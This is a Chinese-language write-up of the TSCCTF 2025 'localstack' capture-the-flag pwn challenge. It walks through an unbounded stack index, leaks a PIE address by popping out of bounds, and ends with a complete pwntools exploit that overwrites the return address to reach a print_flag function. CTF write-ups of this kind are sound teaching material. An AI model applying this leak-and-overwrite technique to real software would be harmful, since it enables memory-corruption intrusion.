
# TSCCTF_2025-localstack
## localstack

:::info
OOB + bypass canary + ret2code + leak pie
:::
![image](https://hackmd.io/_uploads/r1Vurg7cJl.png)
他給了一包壓縮檔，解壓縮後裡面有 Docker 環境、source code、binary
```shell
chal
├── docker-compose.yml
├── Dockerfile
├── share
│   ├── flag
│   ├── localstack
│   ├── localstack.c
│   └── run.sh
└── xinetd
```
先查看他 binary 的相關資訊
```shell
❯ file localstack
localstack: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c325bbd7b5ca330e836fa1ad673ff46da370a5e5, for GNU/Linux 3.2.0, not stripped
```
知道他是 x86-64 並且是 dynamically linked 的 ELF 檔案
然後查看他的 source code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#define MAX_STACK_SIZE 20
#define MAX_INPUT_SIZE 25

void print_flag() {
    char flag[64];
    FILE *f = fopen("flag", "r");
    if (f == NULL) {
        perror("fopen");
        exit(1);
    }
    fgets(flag, sizeof(flag), f);
    printf("%s",flag);
    fclose(f);
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    char input[25];
    char command[25];
    int64_t stack[MAX_STACK_SIZE];
    int64_t top = -1;
    int64_t value;
    puts("Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'");

    while (1) {
        printf(">> ");
        fgets(input, sizeof(input), stdin);
        sscanf(input, "%s", command);

        if (strcmp(command, "push") == 0) {
            if (sscanf(input, "%*s %ld", &value) == 1) {
                stack[++top] = value;
                printf("Pushed %ld to stack\n", value);
            } else {
                printf("Invalid push.\n");
            }
        } else if (strcmp(command, "pop") == 0) {
            printf("Popped %ld from stack\n", stack[top--]);
        } else if (strcmp(command, "show") == 0) {
            printf("Stack top: %ld\n", stack[top]);
        } else if (strcmp(command, "exit") == 0) {
            break;
        }
        else if (strcmp(command, "help") == 0) {
            puts("Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'");
        } else {
            printf("Unknown command: %s\n", command);
        }
    }
    return 0;
}
```
他自己實作了一個簡單的 stack，可以讓我們 push、pop、show 等等操作
- 他有一個 print_flag() 的後門 ==我們要想辦法讓程式執行到這裡==
- 他 stack 的 top 指針沒有做任何限制 ==可以利用 OOB==
接著我們查看他的保護機制
```shell
File:     /home/younglee/Desktop/TSCCTF/localstack/chal/share/localstack
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
他保護機制全開
然後我們試著執行看看
```shell
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> push 1
Pushed 1 to stack
>> push 2
Pushed 2 to stack
>> pop 1
Popped 2 from stack
>> exit
```
正常結束
剛剛有說他的 top 指針沒有做限制那我們試著直接 pop 讓指針變成負數
```shell
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> pop
Popped -2 from stack
>> pop
Popped 64 from stack
>> pop
Popped 93824992236703 from stack
>> pop
Popped 93824992236340 from stack
>> pop
Popped 140737488346056 from stack
>> pop
Popped 140737488345776 from stack
>> pop
Popped 140737488345776 from stack
>> 
```
他噴了很多奇怪的東西，但是不知道那些是什麼
用 ida 看程式結構以及 memory 
![image](https://hackmd.io/_uploads/BJz6GW79Jx.png)
看到程式的反編譯碼
![image](https://hackmd.io/_uploads/B1ukmbX9ye.png)
點到 stack 的　memory　可以看到附近的東西
- 在程式碼中他的型別是用 int64 所以噴出來得東西應該是十進位的，所以我們把他的值轉成 16 進位看看
```cpp
    int64_t stack[MAX_STACK_SIZE];
    int64_t top = -1;
    int64_t value;
```
```shell
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> pop
Popped -2 from stack
>> pop
Popped 64 from stack
>> pop
Popped 93824992236703 from stack # 55555555549F
>> pop
Popped 93824992236340 from stack # 555555555334
>> pop
Popped 140737488346056 from stack # 7FFFFFFFDBC8
>> pop
Popped 140737488345776 from stack # 7FFFFFFFDAB0
>> pop
Popped 140737488345776 from stack # 7FFFFFFFDAB0
>> 
```
看起來很像程式的 address，那我們用 gdb 進去看看
```gdb
pwndbg> x/10i 0x55555555549F
   0x55555555549f <main+363>:   test   eax,eax
   0x5555555554a1 <main+365>:   jne    0x5555555554d9 <main+421>
   0x5555555554a3 <main+367>:   mov    rax,QWORD PTR [rbp-0xf8]
   0x5555555554aa <main+374>:   lea    rdx,[rax-0x1]
   0x5555555554ae <main+378>:   mov    QWORD PTR [rbp-0xf8],rdx
   0x5555555554b5 <main+385>:   mov    rax,QWORD PTR [rbp+rax*8-0xf0]
   0x5555555554bd <main+393>:   mov    rsi,rax
   0x5555555554c0 <main+396>:   lea    rax,[rip+0xbc4]        # 0x55555555608b
   0x5555555554c7 <main+403>:   mov    rdi,rax
   0x5555555554ca <main+406>:   mov    eax,0x0
```
確實他是程式中的位置，並且是在 main function 裡面
- 那就可以用這個 leak 出來的地址加上 offset 算出 print_flag 的位置，再想辦法跳過去執行

利用 objdump 來看 main() 和 print_flag() 間的 offset 是多少
```shell
0000000000001289 <print_flag>:
    1289:	f3 0f 1e fa          	endbr64 
    128d:	55                   	push   rbp
    128e:	48 89 e5             	mov    rbp,rsp
    1291:	48 83 ec 60          	sub    rsp,0x60
    1295:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    129c:	00 00 
    129e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    12a2:	31 c0                	xor    eax,eax
    12a4:	48 8d 05 5d 0d 00 00 	lea    rax,[rip+0xd5d]        # 2008 <_IO_stdin_used+0x8>
    12ab:	48 89 c6             	mov    rsi,rax
    12ae:	48 8d 05 55 0d 00 00 	lea    rax,[rip+0xd55]        # 200a <_IO_stdin_used+0xa>
    12b5:	48 89 c7             	mov    rdi,rax
    12b8:	e8 b3 fe ff ff       	call   1170 <fopen@plt>
    12bd:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
    12c1:	48 83 7d a8 00       	cmp    QWORD PTR [rbp-0x58],0x0
    12c6:	75 19                	jne    12e1 <print_flag+0x58>
    12c8:	48 8d 05 40 0d 00 00 	lea    rax,

0000000000001334 <main>:
    1334:	f3 0f 1e fa          	endbr64 
    1338:	55                   	push   rbp
    1339:	48 89 e5             	mov    rbp,rsp
    133c:	48 81 ec 00 01 00 00 	sub    rsp,0x100
    1343:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    134a:	00 00 
    134c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1350:	31 c0                	xor    eax,eax
    1352:	48 8b 05 c7 2c 00 00 	mov    rax,QWORD PTR [rip+0x2cc7]        # 4020 <stdin@GLIBC_2.2.5>
    1359:	b9 00 00 00 00       	mov    ecx,0x0
    135e:	ba 02 00 00 00       	mov    edx,0x2
    1363:	be 00 00 00 00       	mov    esi,0x0
    1368:	48 89 c7             	mov    rdi,rax
    136b:	e8 f0 fd ff ff       	call   1160 <setvbuf@plt>
    1370:	48 8b 05 99 2c 00 00 	mov    rax,QWORD PTR [rip+0x2c99]        # 4010 <stdout@GLIBC_2.2.5>
```

- main 是 0x1334
- print_flag 是 0x1289
- 兩個相減再加上 363 (剛剛洩漏出來的地址是 main+363)

那我們該如何跳到 print_flag 位置上
![image](https://hackmd.io/_uploads/Sk0JNEmq1e.png)
看到 stack 陣列上是 top 及 value
- top 是指向 stack 陣列的位置 ( OOB )，並且 memory 中他的位置就在 stack 上面，意思說剛剛我們其實有 pop 出來
```sheall
Commands: 'push <value>', 'pop', 'show', 'help', or 'exit'
>> pop
Popped -2 from stack
>> pop
Popped 64 from stack
>>
```
根據 ida 給出的 他應該就是 pop 出 -2 應該就是 pop 出 top 的值
==他為甚麼會 pop 出 -2 並且每次都一樣 ?==
1. 到 top 的位置
2. push 能寫入資料，將 top 寫入 ret 的 address
3. 在利用 push 將 ret address 修改成 print_flag
4. 執行到 ret address 跳到 print_flag

那根據上述步驟完成寫出 expliot
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./localstack")

context.binary = exe

def main():
    #r = process("./localstack")
    r = remote("0.0.0.0","11100")

    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"pop") 

    main_363 = int(r.recvline().decode().split(" ")[1])
    log.success(f"leak main+363 address : {hex(main_363)}")

    print_flag = main_363 - 534
    log.success(f"print_flag address : {hex(print_flag)}")

    r.sendlineafter(">> ",b"push 1")
    r.sendlineafter(">> ",b"push 64")
    r.sendlineafter(">> ",b"push 31")
    log.success(f"{r.recvline().decode()}")
    r.sendlineafter(">> ",b"pop")
    r.sendlineafter(">> ",b"push " + str(print_flag).encode())
    r.sendlineafter(">> ",b"exit")
    #pause()

    r.interactive()


if __name__ == "__main__":
    main()

```
